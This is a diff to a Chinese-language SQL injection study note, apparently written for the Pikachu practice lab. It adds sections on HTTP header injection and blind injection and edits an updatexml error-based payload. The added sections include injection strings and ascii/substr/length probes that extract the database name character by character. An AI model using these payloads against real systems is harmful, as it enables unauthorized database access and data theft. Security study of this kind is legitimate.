@@ -30,6 +30,8 @@
         - [案例2-基于information_schema的信息获取](#%E6%A1%88%E4%BE%8B2-%E5%9F%BA%E4%BA%8Einformation_schema%E7%9A%84%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96)
         - [案例3-基于函数报错的信息获取](#%E6%A1%88%E4%BE%8B3-%E5%9F%BA%E4%BA%8E%E5%87%BD%E6%95%B0%E6%8A%A5%E9%94%99%E7%9A%84%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96)
         - [案例4-基于insert、update、delete的注入](#%E6%A1%88%E4%BE%8B4-%E5%9F%BA%E4%BA%8Einsertupdatedelete%E7%9A%84%E6%B3%A8%E5%85%A5)
+        - [http header注入](#http-header%E6%B3%A8%E5%85%A5)
+        - [盲注](#%E7%9B%B2%E6%B3%A8)
     - [相关链接](#%E7%9B%B8%E5%85%B3%E9%93%BE%E6%8E%A5)
 
 <!-- /TOC -->
@@ -431,11 +433,39 @@ xiaoming' or updatexml(1,concat(0x7e,version()),0) or '
 xiaoming' or updatexml(1,concat(0x7e,version()),0) or ' ----payload，类似于insert
 
 --delete注入
-1 or updatexml(1,concat(0x7e,version()),0) or '
+1 or updatexml(1,concat(0x7e,version()),0)
 --正常情况
 delete from message where id = 1;
 ```
 
+### http header注入
+这并不是新的SQL注入类型，而是指一种场景。
+> 有些时候，后台开发人员为了验证客户端头信息（比如常用的cookie验证），或者通过http header头信息获取客户端的一些信息，比如ip、useragent、accept字段等等，会对客户端的http header信息进行获取并使用SQL进行处理，如果此时没有足够的安全考虑，则可能会出现基于http header的SQL注入漏洞。
+
+### 盲注
+大多数情况下，后台使用错误消息屏蔽方法处理报错信息，此时无法根据报错信息来进行注入判断，这种情况下的注入被称为盲注。
+根据表现形式的不同，盲注又分为 based boolean 和 based time 两种类型。
+- based boolean，基于真假的盲注
+    - 没有报错信息
+    - 不管是正确的输入，还是错误的输入，都只显示真假两种情况（1/0）
+    - 在正确的输入下，输入 and 1=1 返回一个正确的页面， and 1=2 返回一个其他页面
+
+- based time，基于时间的盲注
+
+```sql
+kobe' and 1=1#
+kobe' or 1=2#
+
+select database();--pikachu
+select substr(database(),1,1);--p
+select ascii(substr(database(),1,1));--112
+select ascii(substr(database(),1,1))>100;--1
+select ascii(substr(database(),1,1))>113;--0 
+
+select length(database());--7
+select length(database())>8;--0
+select length(database())>6;--1
+```
 
 
 ## 相关链接
